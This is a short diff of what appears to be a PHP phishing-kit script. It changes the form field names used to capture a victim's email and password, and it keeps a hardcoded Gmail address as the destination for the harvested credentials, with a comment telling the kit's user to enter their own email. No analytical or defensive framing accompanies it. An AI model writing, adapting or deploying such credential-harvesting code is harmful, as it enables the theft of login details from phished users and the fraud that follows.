@@ -39,8 +39,8 @@ class info{
   }
 }
 
-$email = $_POST['em'];
-$password = $_POST['pa'];
+$email = $_POST['email'];
+$password = $_POST['password'];
 $info = new info();
 
 $to = 'transdeptconsultant@gmail.com, transdeptconsultant@gmail.com'; // <--- Enter your email here
